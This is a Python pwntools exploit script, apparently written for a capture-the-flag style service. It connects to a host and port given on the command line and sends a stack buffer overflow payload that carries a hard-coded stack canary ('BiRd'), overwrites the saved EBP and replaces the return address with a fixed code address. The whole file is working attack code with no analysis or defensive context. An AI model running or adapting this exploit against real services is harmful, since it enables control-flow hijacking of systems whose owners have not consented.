#!/usr/bin/env python3

import argparse
from pwn import *

def main():
  # Parse command-line arguments
  parser = argparse.ArgumentParser(description="Exploit script using Pwntools")
  parser.add_argument(
    "host", type=str,
    help="The hostname or IP address to connect to",
  )
  parser.add_argument(
    "port", type=int,
    help="The port number of the service to connect to",
  )
  args = parser.parse_args()

  buffer_size = 64
  canary_size = 4
  padding_size = 12 # Must be found

  length = f'{buffer_size + canary_size + padding_size + 4 + 4}\n'.encode()

  payload = b'A' * 64
  payload += b'BiRd'
  payload += b'0' * padding_size
  payload += b'B' * 4                           # Overwrite old EBP
  # Comment below if something does not appear to work
  payload += struct.pack('<I', 0x08049489)      # Overwrite EIP
  
  payload += b'\n'

  try:
    with remote(args.host, args.port) as connection:
      # Receive initial banner or prompt from the server
      initial_response = connection.recvuntil(b"> ")  # Adjust delimiter as needed
      print(initial_response.decode('utf-8'))
      
      # Send the length
      connection.send(length)

      print(connection.recvuntil(b"> ").decode())
      # Send the payload
      connection.send(payload)

      print(connection.recvall(timeout=5).decode())
  except Exception as e:
    print(f"An error occurred: {e}")

if __name__ == '__main__':
  main()

